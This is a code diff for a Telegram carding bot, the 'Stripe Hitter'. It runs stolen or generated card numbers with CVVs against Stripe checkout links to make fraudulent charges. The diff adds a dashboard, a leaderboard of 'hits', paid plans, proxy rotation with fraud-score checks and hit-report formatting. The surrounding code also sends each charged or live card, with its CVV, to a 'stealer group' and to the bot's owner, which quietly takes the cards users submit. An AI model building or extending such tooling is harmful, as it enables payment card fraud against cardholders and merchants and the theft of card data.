@@ -1014,7 +1014,7 @@ async def send_approved_card_with_gif(update: Update, card: str, gate: str, resp
         )
 
 async def send_hit_to_user_pm(bot, user_id: int, card_data: dict, checkout_data: dict, result: dict, check_time: float):
-    """Send successful hit to user's private chat with anime GIF"""
+    """Send successful hit to user's private chat — SEMEX-style with anime GIF."""
     try:
         from modules.bin_lookup import lookup_bin
 
@@ -1026,47 +1026,48 @@ async def send_hit_to_user_pm(bot, user_id: int, card_data: dict, checkout_data:
         bin6 = cc[:6]
 
         bin_info = lookup_bin(bin6) if cc else {}
-        bank = (bin_info.get('bank') or 'UNKNOWN').upper()
-        brand = (bin_info.get('brand') or 'UNKNOWN').upper()
-        country_name = (bin_info.get('country') or 'Unknown').upper()
-        country_flag = bin_info.get('country_emoji', '🌍')
+        bank     = (bin_info.get('bank')    or 'BANK').upper()
+        brand    = (bin_info.get('brand')   or 'UNKNOWN').upper()
+        card_type = (bin_info.get('type') or bin_info.get('card_type') or 'CREDIT').upper()
+        category = (bin_info.get('level') or bin_info.get('category') or 'UNKNOWN').upper()
+        country  = (bin_info.get('country') or 'UNKNOWN').upper()
+        flag     = bin_info.get('country_emoji', '🌍')
 
         merchant = html.escape(str(checkout_data.get('merchant', 'Unknown')))
-        price = checkout_data.get('price', 0)
+        price    = checkout_data.get('price', 0)
         currency = (checkout_data.get('currency') or 'USD').upper()
-        sym = get_currency_symbol(currency)
+        sym      = get_currency_symbol(currency)
         price_str = f"{sym}{float(price):.2f}" if price else "N/A"
-        amount_str = f"{price_str} {currency}" if price else "N/A"
-
-        checkout_url = checkout_data.get('url', '')
-        url_short = html.escape((checkout_url[:45] + "...") if len(checkout_url) > 45 else checkout_url)
 
         response_text = html.escape(str(result.get('response', 'Payment Successful'))[:80])
         status = result.get('status', 'CHARGED')
+        status_line = "CHARGED ✅" if status == "CHARGED" else "LIVE 🟡"
 
-        sep = "━━━━━━━━━━━━━━━━━━━━"
+        charge_str = f"Charged {currency} {float(price):.1f}" if price else response_text
 
-        hit_msg = (
-            f"💜 <b>ONICHAN • STRIPE HITTER</b>\n"
-            f"{sep}\n"
-            f"💳 <code>{full_card}</code>\n"
-            f"{sep}\n"
-            f"📈 <b>Status</b>   : Charged ✅\n"
-            f"💬 <b>Response</b> : {response_text}\n"
-            f"{sep}\n"
-            f"🔢 <b>BIN</b>      : {bin6}\n"
-            f"💠 <b>Network</b>  : {brand}\n"
-            f"🏦 <b>Bank</b>     : {bank}\n"
-            f"🌍 <b>Country</b>  : {country_name} {country_flag}\n"
-            f"🔗 <b>Merchant</b> : {merchant} — {amount_str}\n"
-            f"{sep}\n"
-            f"⏱ <b>Time</b>     : {check_time:.2f}s\n"
-            f"⚡ <b>Powered</b>  : @{SUPPORT_USERNAME}"
+        success_url = checkout_data.get('success_url') or ''
+        success_line = ""
+        if success_url and success_url != 'N/A':
+            su = html.escape(success_url)
+            su_short = su[:55] + "..." if len(su) > 55 else su
+            success_line = f"\n🎯 <b>Success URL</b> → <a href='{su}'>{su_short}</a>"
+
+        hit_msg = ae(
+            f"[ STRIPE HITTER — /hit ]\n\n"
+            f"💳 <b>CC</b> → <code>{html.escape(full_card)}</code>\n"
+            f"🔴 <b>Status</b> → {status_line}\n"
+            f"🔒 <b>Response</b> → {charge_str}\n"
+            f"💰 <b>BIN</b> → {bin6} — {brand} — {card_type}\n"
+            f"👑 <b>Category</b> → {category}\n"
+            f"🏦 <b>Bank</b> → {bank}\n"
+            f"🌍 <b>Country</b> → {flag} {country}\n"
+            f"🏪 <b>Merchant</b> → {merchant} — {price_str}\n"
+            f"⏱ <b>Time</b> → {check_time:.2f}s"
+            f"{success_line}\n\n"
+            f"⚡ <b>Bot</b> → @{SUPPORT_USERNAME}"
         )
 
-        hit_msg = ae(hit_msg)
         gif_url = get_sexy_anime_gif("success")
-
         await bot.send_animation(
             chat_id=user_id,
             animation=gif_url,
@@ -1080,15 +1081,176 @@ async def send_hit_to_user_pm(bot, user_id: int, card_data: dict, checkout_data:
             await bot.send_message(
                 chat_id=user_id,
                 text=(
-                    f"{EMOJI['charged']} <b>HIT!</b>\n\n"
+                    f"✅ <b>HIT!</b>\n\n"
                     f"💳 <code>{cc}|{mm}|{yy}|{cvv}</code>\n"
-                    f"✅ CHARGED {sym}{float(price) if price else 0:.2f} {currency}"
+                    f"💰 CHARGED {sym}{float(price) if price else 0:.2f} {currency}"
                 ),
                 parse_mode=ParseMode.HTML
             )
         except:
             pass
         return False
+
+
+# ─── Show-Site mode per user ──────────────────────────────────────────────────
+_SHOW_SITE_FILE = None
+
+def _get_show_site_file():
+    global _SHOW_SITE_FILE
+    if _SHOW_SITE_FILE is None:
+        try:
+            from config import DATABASE_DIR
+            import os as _os
+            _SHOW_SITE_FILE = _os.path.join(DATABASE_DIR, "show_site_modes.json")
+        except:
+            _SHOW_SITE_FILE = "/tmp/show_site_modes.json"
+    return _SHOW_SITE_FILE
+
+def get_user_show_site(user_id: int) -> str:
+    """Returns 'always' or 'ask'. Default is 'always'."""
+    try:
+        import json as _j, os as _os
+        f = _get_show_site_file()
+        if _os.path.exists(f):
+            with open(f, 'r') as fp:
+                return _j.load(fp).get(str(user_id), "always")
+    except:
+        pass
+    return "always"
+
+def set_user_show_site(user_id: int, mode: str):
+    try:
+        import json as _j, os as _os
+        f = _get_show_site_file()
+        _os.makedirs(_os.path.dirname(f), exist_ok=True)
+        data = {}
+        if _os.path.exists(f):
+            with open(f, 'r') as fp:
+                data = _j.load(fp)
+        data[str(user_id)] = mode
+        with open(f, 'w') as fp:
+            _j.dump(data, fp)
+    except:
+        pass
+
+
+# ─── Hit-detail block builder ─────────────────────────────────────────────────
+def _build_hit_detail_block(card, result, checkout_data, bin_info, check_time):
+    """Build a SEMEX-style detailed hit block for one charged/live card."""
+    cc  = card.get('cc', '')
+    mm  = card.get('month', '')
+    yy  = card.get('year', '')
+    cvv = card.get('cvv', '')
+    full_card = f"{cc}|{mm}|{yy}|{cvv}"
+
+    brand     = (bin_info.get('brand')    or 'UNKNOWN').upper()
+    card_type = (bin_info.get('type') or bin_info.get('card_type') or 'CREDIT').upper()
+    bank      = (bin_info.get('bank')     or 'BANK').upper()
+    country   = (bin_info.get('country')  or 'UNKNOWN').upper()
+    flag      = bin_info.get('country_emoji', '🌍')
+    category  = (bin_info.get('level') or bin_info.get('category') or 'UNKNOWN').upper()
+    bin6      = cc[:6]
+
+    status     = result.get('status', 'CHARGED')
+    status_line = "CHARGED ✅" if status == "CHARGED" else "LIVE 🟡"
+    price      = checkout_data.get('price', 0)
+    currency   = (checkout_data.get('currency') or 'USD').upper()
+    charge_str = f"Charged {currency} {float(price):.1f}" if price else html.escape(str(result.get('response', ''))[:60])
+
+    success_url = checkout_data.get('success_url') or ''
+    success_line = ""
+    if success_url and success_url != 'N/A':
+        su = html.escape(success_url)
+        su_short = su[:50] + "..." if len(su) > 50 else su
+        success_line = f"\n🎯 <b>Success URL</b> → <a href='{su}'>{su_short}</a>"
+
+    return (
+        f"💳 <b>CC</b> → <code>{html.escape(full_card)}</code>\n"
+        f"🔴 <b>Status</b> → {status_line}\n"
+        f"🔒 <b>Response</b> → {charge_str}\n"
+        f"💰 <b>BIN</b> → {bin6} — {brand} — {card_type}\n"
+        f"👑 <b>Category</b> → {category}\n"
+        f"🏦 <b>Bank</b> → {bank}\n"
+        f"🌍 <b>Country</b> → {flag} {country}\n"
+        f"⏱ <b>Time</b> → {check_time:.2f}s"
+        f"{success_line}"
+    )
+
+
+# ─── Dashboard helpers ────────────────────────────────────────────────────────
+def _build_hit_dashboard(user, stats, rank, premium_info_line):
+    """Return (text, InlineKeyboardMarkup) for the /hit main dashboard."""
+    total   = stats.get('total',   0)
+    approved = stats.get('approved', 0)
+    uname   = f"@{user.username}" if user.username else str(user.id)
+
+    text = ae(
+        f"[ 🔥 STRIPE HITTER — /hit ]\n\n"
+        f"👋 <b>Welcome, {html.escape(user.first_name)}!</b>\n"
+        f"┌ User 〝 {html.escape(uname)}\n"
+        f"└ ID 〝 <code>{user.id}</code>\n\n"
+        f"📋 <b>Plan Status</b>\n"
+        f"├ {rank}\n"
+        f"└ {html.escape(premium_info_line)}\n\n"
+        f"✅ <b>All-Time Stats</b>\n"
+        f"├ Total Checked 〝 {total:,}\n"
+        f"└ Charged 〝 {approved:,}\n\n"
+        f"<i>Use /hit &lt;url&gt; &lt;card|mm|yy|cvv&gt; to start hitting</i>"
+    )
+
+    keyboard = InlineKeyboardMarkup([
+        [
+            _btn("⚡ Hit Cards",  style="danger",  callback_data="hit_hitcards"),
+            _btn("🎰 Generator",  style="danger",  callback_data="hit_generator"),
+        ],
+        [
+            _btn("✅ My Hits",    style="success", callback_data="hit_myhits"),
+            _btn("📊 My Status", style="success", callback_data="hit_status"),
+        ],
+        [
+            _btn("👑 Ranking",    style="primary", callback_data="hit_ranking"),
+            _btn("💾 Saved BINs", style="primary", callback_data="hit_savedbins"),
+        ],
+        [
+            _btn("📋 Plans",      style="default", callback_data="hit_plans"),
+            _btn("⚙️ Settings",  style="default", callback_data="hit_settings"),
+        ],
+        [_btn("🔗 Support", style="primary", url=f"https://t.me/{SUPPORT_USERNAME}")],
+    ])
+    return text, keyboard
+
+
+def _get_user_recent_hits(user_id, limit=5):
+    """Return last N hitter-charged card lines from the approved log."""
+    from modules.approved_cards_logger import get_user_approved_cards
+    all_cards = get_user_approved_cards(user_id, limit=500)
+    hits = []
+    for line in reversed(all_cards):
+        parts = line.split('|')
+        if len(parts) >= 5:
+            gate = parts[4].strip()
+            if 'hitter' in gate or gate.startswith('auto_hit'):
+                hits.append(parts)
+        if len(hits) >= limit:
+            break
+    return hits
+
+
+def _get_hit_leaderboard(limit=10):
+    """Top users by hitter-charged count from approved cards log."""
+    from modules.approved_cards_logger import get_approved_cards
+    user_data: dict = {}
+    for line in get_approved_cards(limit=20000):
+        parts = line.split('|')
+        if len(parts) >= 5:
+            uid   = parts[1].strip()
+            uname = parts[2].strip().lstrip('@')
+            gate  = parts[4].strip()
+            if 'hitter' in gate or gate.startswith('auto_hit'):
+                if uid not in user_data:
+                    user_data[uid] = {'username': uname, 'count': 0}
+                user_data[uid]['count'] += 1
+    return sorted(user_data.items(), key=lambda x: x[1]['count'], reverse=True)[:limit]
 
 # ============================================================================
 # ACCESS CONTROL DECORATOR
@@ -2539,38 +2701,382 @@ async def _reply_with_gif(message, category: str, text: str, parse_mode=ParseMod
             pass
     await message.reply_text(text=text, parse_mode=parse_mode, reply_markup=reply_markup)
 
-async def _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, progress_done, email=None, trial_info=None):
-    """Build the card-by-card status message"""
-    done_icon = "✅ Done" if progress_done >= len(cards) else "⚡ Running..."
+async def _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, progress_done, email=None, trial_info=None, hit_details=None):
+    """Build SEMEX-style card-by-card status message."""
+    is_done = progress_done >= len(cards)
+    done_text = "Done" if is_done else "Running..."
+
     safe_url = html.escape(str(success_url or "N/A"))
-    url_short = safe_url[:50] + "..." if len(safe_url) > 50 else safe_url
-    safe_price = html.escape(str(price_str or "N/A"))
-    sep = "━━━━━━━━━━━━━━━━━━━━"
+    url_short = safe_url[:60] + "..." if len(safe_url) > 60 else safe_url
+
     text = (
-        f"💜 <b>ONICHAN • STRIPE HITTER</b>\n"
-        f"{sep}\n"
-        f"🔗 <b>Link</b>      : {url_short}\n"
-        f"🏪 <b>Merchant</b>  : {merchant} — {safe_price}\n"
-        f"📊 <b>Progress</b>  : {progress_done}/{len(cards)} — {done_icon}\n"
+        f"[ STRIPE HITTER — /hit ]\n\n"
+        f"🔗 <b>Link</b> → <code>{url_short}</code>\n"
+        f"🏪 <b>Merchant</b> → {html.escape(str(merchant))} — {html.escape(str(price_str))}\n"
+        f"📊 <b>Processed</b> → {progress_done}/{len(cards)} — {done_text}\n"
     )
     if trial_info:
-        text += f"🔐 <b>Trial</b>     : {html.escape(str(trial_info))}\n"
-    text += f"{sep}\n"
+        text += f"🔐 <b>Trial</b> → {html.escape(str(trial_info))}\n"
+    text += "\n"
+
     for idx, card in enumerate(cards):
         cc = card['cc']
         masked = f"{cc[:6]}xxxxx{cc[-4:]}|{card['month']}|{card['year']}"
-        status = card_statuses[idx]
-        text += f"💳 {masked} → {status}\n"
-    text += sep
+        raw = card_statuses[idx]
+
+        if "CHARGED" in raw or ("Charged" in raw and "—" not in raw[:14]):
+            icon, note = "✅", "Payment Successful"
+        elif "LIVE" in raw or ("Live" in raw and "—" not in raw[:10]):
+            icon, note = "🟡", "Live"
+        elif "Hitting" in raw or "Pending" in raw:
+            icon, note = "⚡", "Hitting..."
+        elif "Declined" in raw or "DECLINED" in raw:
+            extra = raw.split("—", 1)[-1].strip()[:45] if "—" in raw else "Declined"
+            icon, note = "❌", extra
+        elif "3DS" in raw:
+            icon, note = "🔐", "3DS Required"
+        elif "Stopped" in raw:
+            icon, note = "🛑", "Stopped"
+        else:
+            note = raw.split("—", 1)[-1].strip()[:45] if "—" in raw else raw[:45]
+            icon = "⚠️"
+
+        text += f"{icon} <code>{html.escape(masked)}</code> — {html.escape(str(note))}\n"
+
+    if hit_details:
+        text += f"\n⚡ <b>Hits:</b>\n"
+        for block in hit_details:
+            text += f"\n{block}\n"
+
     return ae(text)
 
 
 async def hit_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle Hit All / Hit First / Close / Stop button callbacks"""
+    """Handle /hit dashboard and hit-runner button callbacks."""
     query = update.callback_query
-    user = query.from_user
-    data = query.data
-    
+    user  = query.from_user
+    data  = query.data
+
+    # ── Dashboard: Home ────────────────────────────────────────────────────────
+    if data == "hit_home":
+        await query.answer()
+        from modules.database import get_user_check_stats
+        stats = get_user_check_stats(user.id)
+        rank  = get_user_rank(user.id)
+        premium_info = "👤 Free — Limited access"
+        try:
+            from modules.database import _execute_with_retry
+            row = _execute_with_retry(
+                "SELECT premium, premium_expiry FROM users WHERE user_id = %s",
+                (user.id,), fetch_one=True
+            )
+            if is_owner(user.id):
+                premium_info = "👑 Owner — Unlimited access"
+            elif row and row.get("premium") and row.get("premium_expiry"):
+                premium_info = f"💎 Premium | Expires {row['premium_expiry'].strftime('%Y-%m-%d')}"
+            elif row and row.get("premium"):
+                premium_info = "💎 Premium — Unlimited access"
+            elif is_approved(user.id):
+                premium_info = "✅ Approved — Free tier"
+        except:
+            premium_info = "✅ Active"
+        dash_text, dash_kb = _build_hit_dashboard(user, stats, rank, premium_info)
+        try:
+            await query.message.edit_caption(caption=dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
+        except:
+            try:
+                await query.message.edit_text(dash_text, parse_mode=ParseMode.HTML, reply_markup=dash_kb)
+            except:
+                pass
+        return
+
+    # ── Dashboard: Hit Cards (usage hint) ──────────────────────────────────────
+    if data == "hit_hitcards":
+        await query.answer()
+        text = ae(
+            f"[ ⚡ HIT CARDS ]\n\n"
+            f"Send a command like:\n"
+            f"<code>/hit https://checkout.stripe.com/... cc|mm|yy|cvv</code>\n\n"
+            f"Or generate from BIN:\n"
+            f"<code>/hit https://... 453201</code>\n\n"
+            f"Or just send the URL and pick a saved BIN:\n"
+            f"<code>/hit https://checkout.stripe.com/...</code>"
+        )
+        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Generator (redirect to gen menu) ────────────────────────────
+    if data == "hit_generator":
+        await query.answer("Use /gen or /genbin to generate cards", show_alert=True)
+        return
+
+    # ── Dashboard: My Hits ────────────────────────────────────────────────────
+    if data == "hit_myhits":
+        await query.answer()
+        hits = _get_user_recent_hits(user.id, limit=8)
+        if not hits:
+            text = ae("[ ✅ MY HITS ]\n\nNo hitter charges recorded yet.\nUse /hit to start hitting cards.")
+        else:
+            lines = ["[ ✅ MY HITS — Recent Charged ]\n"]
+            for idx, parts in enumerate(hits, 1):
+                ts     = parts[0].strip()[:16] if parts else "?"
+                card   = parts[3].strip() if len(parts) > 3 else "?"
+                gate   = parts[4].strip() if len(parts) > 4 else ""
+                resp   = parts[5].strip()[:30] if len(parts) > 5 else ""
+                c_parts = card.split("|")
+                cc_mask = f"{c_parts[0][:6]}****{c_parts[0][-4:]}" if c_parts and len(c_parts[0]) >= 10 else card[:16]
+                lines.append(f"✅ {cc_mask} — {resp}")
+            lines.append(f"\n<i>Showing last {len(hits)} hits</i>")
+            text = ae("\n".join(lines))
+        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: My Status ──────────────────────────────────────────────────
+    if data == "hit_status":
+        await query.answer()
+        from modules.database import get_user_check_stats
+        stats   = get_user_check_stats(user.id)
+        rank    = get_user_rank(user.id)
+        total   = stats.get('total', 0)
+        approved = stats.get('approved', 0)
+        declined = stats.get('declined', 0)
+        rate    = stats.get('success_rate', 0)
+        since   = stats.get('first_check')
+        since_str = since.strftime('%Y-%m-%d') if since else 'N/A'
+        uname   = f"@{user.username}" if user.username else str(user.id)
+        text = ae(
+            f"[ 📊 MY STATUS ]\n\n"
+            f"👤 User 〝 {html.escape(uname)}\n"
+            f"🆔 ID 〝 <code>{user.id}</code>\n"
+            f"🏅 Rank 〝 {rank}\n"
+            f"📅 Since 〝 {since_str}\n\n"
+            f"✅ All-Time Stats\n"
+            f"├ Total Checked 〝 {total:,}\n"
+            f"├ Charged/Live 〝 {approved:,}\n"
+            f"├ Declined 〝 {declined:,}\n"
+            f"└ Success Rate 〝 {rate}%"
+        )
+        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Ranking ────────────────────────────────────────────────────
+    if data == "hit_ranking":
+        await query.answer()
+        board = _get_hit_leaderboard(limit=10)
+        if not board:
+            text = ae("[ 👑 RANKING ]\n\nNo hitter data yet. Be the first to hit!")
+        else:
+            medals = ["🥇", "🥈", "🥉"] + ["🎯"] * 10
+            lines  = ["[ 👑 HITTER RANKING — Top Charged ]\n"]
+            for pos, (uid, info) in enumerate(board):
+                medal = medals[pos] if pos < len(medals) else f"#{pos+1}"
+                uname = html.escape(info['username'] or uid)
+                cnt   = info['count']
+                you   = " ← you" if str(user.id) == uid else ""
+                lines.append(f"{medal} @{uname} — {cnt} hit(s){you}")
+            text = ae("\n".join(lines))
+        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Saved BINs ─────────────────────────────────────────────────
+    if data == "hit_savedbins":
+        await query.answer()
+        saved = get_user_saved_bins(user.id)
+        if not saved:
+            text = ae(
+                f"[ 💾 SAVED BINS ]\n\n"
+                f"No BINs saved yet.\n\n"
+                f"Save one with:\n"
+                f"<code>/savebin name 453201</code>"
+            )
+        else:
+            lines = [f"[ 💾 SAVED BINS ({len(saved)}) ]\n"]
+            for b in saved:
+                lines.append(f"💳 <code>{html.escape(b['name'])}</code> ➜ <code>{html.escape(b['bin_value'])}</code>")
+            lines.append(f"\n<code>/savebin &lt;name&gt; &lt;bin&gt;</code> — Save")
+            lines.append(f"<code>/deletebin &lt;name&gt;</code> — Remove")
+            text = ae("\n".join(lines))
+        kb = InlineKeyboardMarkup([[_btn("🏠 Back", style="default", callback_data="hit_home")]])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Plans ──────────────────────────────────────────────────────
+    if data == "hit_plans":
+        await query.answer()
+        plans = get_all_plans()
+        lines = ["[ 📋 PLANS & PRICING ]\n"]
+        plan_icons = {"free": "🆓", "tier1": "⭐", "tier2": "💎", "tier3": "💠"}
+        for key, plan in plans.items():
+            icon = plan_icons.get(key, "📦")
+            price = plan.get('price', '?')
+            currency = plan.get('currency', '$')
+            name = plan.get('name', key)
+            days = plan.get('duration_days', 0)
+            lines.append(f"{icon} <b>{html.escape(name)}</b> — {currency}{price} ({days}d)")
+        lines.append(
+            f"\n<b>Credit System</b>\n"
+            f"• 1 Charged Card = 5 credits\n"
+            f"• Declined = Free (no cost)\n\n"
+            f"<b>How to get premium:</b>\n"
+            f"1. Contact @{SUPPORT_USERNAME}\n"
+            f"2. Use /buy to purchase\n"
+            f"3. Redeem code: /redeem CODE"
+        )
+        kb = InlineKeyboardMarkup([
+            [_btn("💬 Contact", style="primary", url=f"https://t.me/{SUPPORT_USERNAME}")],
+            [_btn("🏠 Back", style="default", callback_data="hit_home")],
+        ])
+        text = ae("\n".join(lines))
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Settings ───────────────────────────────────────────────────
+    if data == "hit_settings":
+        await query.answer()
+        proxy_mode = get_user_proxy_mode(user.id)
+        site_mode  = get_user_show_site(user.id)
+        user_proxies = ah_get_user_proxies(user.id)
+
+        proxy_label = "🌐 System Proxy" if proxy_mode == "system" else f"🔒 Own Proxy ({len(user_proxies)} saved)"
+        site_label  = "👁 Always Show" if site_mode == "always" else "❓ Ask Every Time"
+        proxy_count = f"{len(user_proxies)} saved" if user_proxies else "None — add with /proxy add"
+
+        text = ae(
+            f"[ ⚙️ SETTINGS ]\n\n"
+            f"🔌 <b>Proxy Mode:</b> {proxy_label}\n"
+            f"<i>System Proxy uses hosting IP (no proxy)</i>\n\n"
+            f"🌍 <b>Show Site (Public):</b> {site_label}\n"
+            f"<i>Controls merchant visibility in channel</i>\n\n"
+            f"📋 <b>Your Proxies:</b> {proxy_count}\n\n"
+            f"<code>/proxy add host:port:user:pass</code>\n"
+            f"<code>/proxy del host:port:user:pass</code>\n"
+            f"<code>/proxy test</code> — Test your proxies\n"
+            f"<code>/ipcheck</code> — Check IP fraud score"
+        )
+        toggle_proxy_label = "✅ Switch to Own Proxy" if proxy_mode == "system" else "✅ Switch to System Proxy"
+        toggle_proxy_cb    = "hit_toggle_proxy"
+        toggle_site_label  = "👁 Set: Always Show" if site_mode == "ask" else "❓ Set: Ask Every Time"
+        toggle_site_cb     = "hit_toggle_site"
+        kb = InlineKeyboardMarkup([
+            [_btn(toggle_proxy_label, style="success", callback_data=toggle_proxy_cb)],
+            [_btn(toggle_site_label,  style="primary", callback_data=toggle_site_cb)],
+            [_btn("🏠 Back", style="default", callback_data="hit_home")],
+        ])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Toggle Proxy Mode ──────────────────────────────────────────
+    if data == "hit_toggle_proxy":
+        current = get_user_proxy_mode(user.id)
+        if current == "system":
+            user_proxies = ah_get_user_proxies(user.id)
+            if not user_proxies:
+                await query.answer("Add a proxy first with /proxy add", show_alert=True)
+                return
+            set_user_proxy_mode(user.id, "own")
+            await query.answer("Switched to Own Proxy ✅", show_alert=False)
+        else:
+            set_user_proxy_mode(user.id, "system")
+            await query.answer("Switched to System Proxy ✅", show_alert=False)
+        # Re-render settings
+        context.args = []
+        data = "hit_settings"
+        # Fall through to settings render by reusing callback logic:
+        proxy_mode   = get_user_proxy_mode(user.id)
+        site_mode    = get_user_show_site(user.id)
+        user_proxies = ah_get_user_proxies(user.id)
+        proxy_label  = "🌐 System Proxy" if proxy_mode == "system" else f"🔒 Own Proxy ({len(user_proxies)} saved)"
+        site_label   = "👁 Always Show" if site_mode == "always" else "❓ Ask Every Time"
+        proxy_count  = f"{len(user_proxies)} saved" if user_proxies else "None — add with /proxy add"
+        text = ae(
+            f"[ ⚙️ SETTINGS ]\n\n"
+            f"🔌 <b>Proxy Mode:</b> {proxy_label}\n"
+            f"<i>System Proxy uses hosting IP (no proxy)</i>\n\n"
+            f"🌍 <b>Show Site (Public):</b> {site_label}\n"
+            f"<i>Controls merchant visibility in channel</i>\n\n"
+            f"📋 <b>Your Proxies:</b> {proxy_count}\n\n"
+            f"<code>/proxy add host:port:user:pass</code>\n"
+            f"<code>/proxy del host:port:user:pass</code>\n"
+            f"<code>/proxy test</code> — Test your proxies\n"
+            f"<code>/ipcheck</code> — Check IP fraud score"
+        )
+        toggle_proxy_label = "✅ Switch to Own Proxy" if proxy_mode == "system" else "✅ Switch to System Proxy"
+        toggle_site_label  = "👁 Set: Always Show" if site_mode == "ask" else "❓ Set: Ask Every Time"
+        kb = InlineKeyboardMarkup([
+            [_btn(toggle_proxy_label, style="success", callback_data="hit_toggle_proxy")],
+            [_btn(toggle_site_label,  style="primary", callback_data="hit_toggle_site")],
+            [_btn("🏠 Back", style="default", callback_data="hit_home")],
+        ])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Dashboard: Toggle Show Site ───────────────────────────────────────────
+    if data == "hit_toggle_site":
+        current = get_user_show_site(user.id)
+        new_mode = "ask" if current == "always" else "always"
+        set_user_show_site(user.id, new_mode)
+        label = "Always Show" if new_mode == "always" else "Ask Every Time"
+        await query.answer(f"Show Site set to: {label} ✅", show_alert=False)
+        proxy_mode   = get_user_proxy_mode(user.id)
+        site_mode    = new_mode
+        user_proxies = ah_get_user_proxies(user.id)
+        proxy_label  = "🌐 System Proxy" if proxy_mode == "system" else f"🔒 Own Proxy ({len(user_proxies)} saved)"
+        site_label   = "👁 Always Show" if site_mode == "always" else "❓ Ask Every Time"
+        proxy_count  = f"{len(user_proxies)} saved" if user_proxies else "None — add with /proxy add"
+        text = ae(
+            f"[ ⚙️ SETTINGS ]\n\n"
+            f"🔌 <b>Proxy Mode:</b> {proxy_label}\n"
+            f"<i>System Proxy uses hosting IP (no proxy)</i>\n\n"
+            f"🌍 <b>Show Site (Public):</b> {site_label}\n"
+            f"<i>Controls merchant visibility in channel</i>\n\n"
+            f"📋 <b>Your Proxies:</b> {proxy_count}\n\n"
+            f"<code>/proxy add host:port:user:pass</code>\n"
+            f"<code>/proxy del host:port:user:pass</code>\n"
+            f"<code>/proxy test</code> — Test your proxies\n"
+            f"<code>/ipcheck</code> — Check IP fraud score"
+        )
+        toggle_proxy_label = "✅ Switch to Own Proxy" if proxy_mode == "system" else "✅ Switch to System Proxy"
+        toggle_site_label  = "👁 Set: Always Show" if site_mode == "ask" else "❓ Set: Ask Every Time"
+        kb = InlineKeyboardMarkup([
+            [_btn(toggle_proxy_label, style="success", callback_data="hit_toggle_proxy")],
+            [_btn(toggle_site_label,  style="primary", callback_data="hit_toggle_site")],
+            [_btn("🏠 Back", style="default", callback_data="hit_home")],
+        ])
+        try:
+            await query.message.edit_caption(caption=text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        except:
+            await query.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
+        return
+
+    # ── Existing: close / stop ────────────────────────────────────────────────
     if data.startswith("hitclose_"):
         hit_key = data.replace("hitclose_", "")
         _pending_hits.pop(hit_key, None)
@@ -13582,6 +14088,7 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
         await _safe_edit(loading_msg, status_text, parse_mode=ParseMode.HTML, reply_markup=stop_keyboard)
 
         results = {"charged": [], "live": [], "declined": [], "3ds": [], "error": []}
+        hit_detail_blocks: list = []
 
         for i, card in enumerate(cards):
             if not _active_hits.get(hit_key, False):
@@ -13619,6 +14126,8 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                                   "auto_hitter", response_text, _bin_info)
                 await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
                                             "auto_hitter", response_text, _bin_info, user.id, user.username or user.first_name)
+                check_time = float(result.get('time', 2.5) or 2.5)
+                hit_detail_blocks.append(_build_hit_detail_block(card, result, checkout_data, _bin_info, check_time))
                 try:
                     from config import OWNER_ID
                     await context.bot.send_message(
@@ -13631,7 +14140,6 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                     )
                 except:
                     pass
-                check_time = float(result.get('time', 2.5) or 2.5)
                 await send_hit_to_user_pm(context.bot, user.id, card, checkout_data, result, check_time)
             elif status == "LIVE":
                 card_statuses[i] = f"LIVE {EMOJI['live']} — {response_text[:50]}"
@@ -13646,6 +14154,8 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                                   "auto_hitter_live", response_text, _bin_info)
                 await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
                                             "auto_hitter_live", response_text, _bin_info, user.id, user.username or user.first_name)
+                check_time = float(result.get('time', 2.5) or 2.5)
+                hit_detail_blocks.append(_build_hit_detail_block(card, result, checkout_data, _bin_info, check_time))
                 try:
                     from config import OWNER_ID
                     await context.bot.send_message(
@@ -13687,14 +14197,18 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                 await asyncio.sleep(1)
 
